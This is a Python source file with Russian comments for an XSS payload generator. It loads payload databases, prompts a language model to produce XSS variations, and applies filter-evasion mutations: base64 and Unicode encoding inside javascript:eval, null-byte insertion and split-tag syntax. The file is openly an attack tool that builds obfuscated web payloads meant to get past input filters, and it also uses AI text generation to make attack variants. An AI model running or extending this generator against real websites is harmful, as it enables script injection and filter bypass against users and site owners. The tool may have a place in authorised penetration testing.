import json
import random
from typing import List, Dict, Optional
import yaml
from transformers import pipeline, AutoTokenizer, AutoModelForCausalLM
import os

class PayloadGenerator:
    def __init__(self, config_path: str = "config.yaml"):
        with open(config_path, 'r') as f:
            self.config = yaml.safe_load(f)
        
        # Загружаем базу пейлоадов
        self.payloads_db = self.load_payloads_database()
        
        # Инициализируем ML модель для генерации
        self.ml_enabled = self.config.get('ml_models', {}).get('enabled', False)
        if self.ml_enabled:
            self.init_ml_model()
    
    def load_payloads_database(self) -> Dict:
        """Загружаем структурированную базу пейлоадов"""
        db_path = self.config['payloads']['database_path']
        
        if db_path.endswith('.json'):
            with open(db_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        elif db_path.endswith('.yaml') or db_path.endswith('.yml'):
            with open(db_path, 'r', encoding='utf-8') as f:
                return yaml.safe_load(f)
        else:
            # Запасной вариант - загрузка из текстовых файлов
            return self.load_payloads_from_txt()
    
    def load_payloads_from_txt(self) -> Dict:
        """Загрузка пейлоадов из текстовых файлов (старый формат)"""
        payloads = []
        payloads_dir = self.config['payloads'].get('directory', 'payloads')
        
        # Чтение всех текстовых файлов в директории
        for root, dirs, files in os.walk(payloads_dir):
            for file in files:
                if file.endswith('.txt'):
                    file_path = os.path.join(root, file)
                    with open(file_path, 'r', encoding='utf-8') as f:
                        for line in f:
                            line = line.strip()
                            if line and not line.startswith('#'):
                                # Определяем тип по пути
                                payload_type = os.path.basename(os.path.dirname(file_path))
                                category = os.path.splitext(file)[0]
                                
                                payloads.append({
                                    'type': payload_type,
                                    'category': category,
                                    'payload': line,
                                    'description': f"Loaded from {file}",
                                    'obfuscation_level': 1 if 'basic' in category else 3,
                                    'bypass_techniques': []
                                })
        
        return {'payloads': payloads}
    
    def init_ml_model(self):
        """Инициализация ML модели для генерации пейлоадов"""
        model_name = self.config['ml_models']['model_name']
        
        try:
            self.tokenizer = AutoTokenizer.from_pretrained(model_name)
            self.model = AutoModelForCausalLM.from_pretrained(model_name)
            self.generator = pipeline('text-generation', 
                                     model=self.model, 
                                     tokenizer=self.tokenizer)
            
            # Загружаем датасет для дообучения
            self.training_data = self.load_training_data()
            
            print(f"ML модель {model_name} загружена успешно")
        except Exception as e:
            print(f"Ошибка загрузки ML модели: {e}")
            self.ml_enabled = False
    
    def load_training_data(self) -> List[str]:
        """Загрузка данных для обучения модели"""
        training_data = []
        
        # Используем существующие пейлоады как тренировочные данные
        for payload in self.payloads_db.get('payloads', []):
            training_data.append(payload['payload'])
        
        # Добавляем шаблоны для обучения
        templates = [
            "XSS payload: <script>alert('{random}')</script>",
            "JavaScript injection: javascript:{function}('{param}')",
            "HTML injection: <img src=x onerror={function}>",
            "SVG payload: <svg onload={function}>",
            "Event handler: onmouseover={function}",
        ]
        
        training_data.extend(templates)
        return training_data
    
    def generate_with_ml(self, base_payload: str, variations: int = 5) -> List[str]:
        """Генерация вариаций пейлоада с помощью ML"""
        if not self.ml_enabled:
            return [base_payload]
        
        generated = []
        prompt = f"Generate XSS payload variations for: {base_payload}\nVariations:"
        
        try:
            results = self.generator(
                prompt,
                max_length=100,
                num_return_sequences=variations,
                temperature=0.8,
                top_p=0.9,
                do_sample=True
            )
            
            for result in results:
                generated_text = result['generated_text']
                # Извлекаем только пейлоады из сгенерированного текста
                lines = generated_text.split('\n')
                for line in lines:
                    if any(keyword in line.lower() for keyword in 
                           ['<script>', 'alert', 'onerror', 'javascript:', 'eval']):
                        # Очищаем пейлоад от лишнего текста
                        payload = self.extract_payload(line)
                        if payload and payload not in generated:
                            generated.append(payload)
            
        except Exception as e:
            print(f"Ошибка генерации ML: {e}")
        
        # Если ML не сгенерировал достаточно вариаций, используем традиционные методы
        if len(generated) < variations:
            generated.extend(self.generate_traditional_variations(
                base_payload, 
                variations - len(generated)
            ))
        
        return generated[:variations]
    
    def extract_payload(self, text: str) -> str:
        """Извлечение чистого пейлоада из текста"""
        # Ищем начало пейлоада
        start_tags = ['<script>', '<img', '<svg', '<body', '<input', 'javascript:']
        for tag in start_tags:
            if tag in text:
                idx = text.find(tag)
                # Берем фрагмент текста от начала тега до конца строки или до кавычки
                fragment = text[idx:]
                # Обрезаем по определенным символам
                for end_char in ['\n', ' ', ')', ';', '>']:
                    if end_char in fragment:
                        end_idx = fragment.find(end_char)
                        return fragment[:end_idx + 1] if end_char != '>' else fragment[:end_idx]
                return fragment
        
        return text.strip()
    
    def generate_traditional_variations(self, base_payload: str, count: int) -> List[str]:
        """Традиционные методы генерации вариаций"""
        variations = []
        
        obfuscation_methods = [
            self.html_encode,
            self.url_encode,
            self.unicode_encode,
            self.base64_encode,
            self.insert_null_bytes,
            self.use_alternative_syntax,
        ]
        
        for i in range(count):
            method = random.choice(obfuscation_methods)
            variations.append(method(base_payload))
        
        return variations
    
    def html_encode(self, payload: str) -> str:
        """HTML кодирование"""
        encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
        return f"javascript:{encoded}"
    
    def url_encode(self, payload: str) -> str:
        """URL кодирование"""
        import urllib.parse
        return urllib.parse.quote(payload)
    
    def unicode_encode(self, payload: str) -> str:
        """Unicode кодирование"""
        encoded = ''.join([f'\\u{ord(c):04x}' for c in payload])
        return f"javascript:eval('{encoded}')"
    
    def base64_encode(self, payload: str) -> str:
        """Base64 кодирование"""
        import base64
        encoded = base64.b64encode(payload.encode()).decode()
        return f"javascript:eval(atob('{encoded}'))"
    
    def insert_null_bytes(self, payload: str) -> str:
        """Вставка нуль-байтов"""
        return payload.replace('script', 'scr\x00ipt')
    
    def use_alternative_syntax(self, payload: str) -> str:
        """Альтернативный синтаксис"""
        alternatives = {
            '<script>': ['<scr<script>ipt>', '<scr\\x00ipt>', '<script/random>'],
            'alert': ['al\\x65rt', 'al\x00ert', 'window.alert'],
            'javascript:': ['java\\x00script:', 'jav&#x61;script:'],
        }
        
        result = payload
        for original, replacements in alternatives.items():
            if original in result:
                result = result.replace(original, random.choice(replacements))
        
        return result
    
    def get_payloads_by_type(self, payload_type: str = None, 
                            category: str = None, 
                            count: int = 10) -> List[Dict]:
        """Получение пейлоадов по фильтрам"""
        all_payloads = self.payloads_db.get('payloads', [])
        
        # Фильтрация
        filtered = all_payloads
        if payload_type:
            filtered = [p for p in filtered if p['type'] == payload_type]
        if category:
            filtered = [p for p in filtered if p['category'] == category]
        
        # Выбор случайных пейлоадов
        selected = random.sample(filtered, min(count, len(filtered)))
        
        # Генерация вариаций через ML если включено
        if self.ml_enabled:
            enhanced_payloads = []
            for payload in selected:
                base = payload['payload']
                variations = self.generate_with_ml(base, variations=3)
                
                for var in variations:
                    enhanced = payload.copy()
                    enhanced['payload'] = var
                    enhanced['generated_by'] = 'ml_models'
                    enhanced_payloads.append(enhanced)
            
            selected = enhanced_payloads[:count]
        
        return selected
    
    def add_payload(self, payload: Dict):
        """Добавление нового пейлоада в базу"""
        self.payloads_db['payloads'].append(payload)
        
        # Сохранение обновленной базы
        db_path = self.config['payloads']['database_path']
        if db_path.endswith('.json'):
            with open(db_path, 'w', encoding='utf-8') as f:
                json.dump(self.payloads_db, f, indent=2, ensure_ascii=False)
    
    def get_statistics(self) -> Dict:
        """Статистика по базе пейлоадов"""
        return self.payloads_db.get('statistics', {})